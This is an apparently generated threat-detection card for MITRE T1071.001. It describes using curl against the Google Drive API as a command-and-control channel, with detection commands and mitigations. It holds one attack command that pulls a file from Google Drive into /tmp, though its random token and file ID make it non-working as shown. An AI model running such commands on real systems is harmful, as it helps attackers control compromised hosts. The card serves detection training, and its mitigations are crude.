---
type: campaign
scenario_id: 373
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with Google Drive for C2.

## Threat Description
Using curl to communicate with Google Drive for C2.

## Attack Command
```
curl -H "Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)" https://www.googleapis.com/drive/v3/files/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)?alt=media -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl Google Drive: `ps aux | grep curl | grep googleapis.com`; Network traffic: `tcpdump -i any host www.googleapis.com`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block Google APIs: `iptables -A OUTPUT -d www.googleapis.com -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via Google Drive by analyzing HTTP headers, Google API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
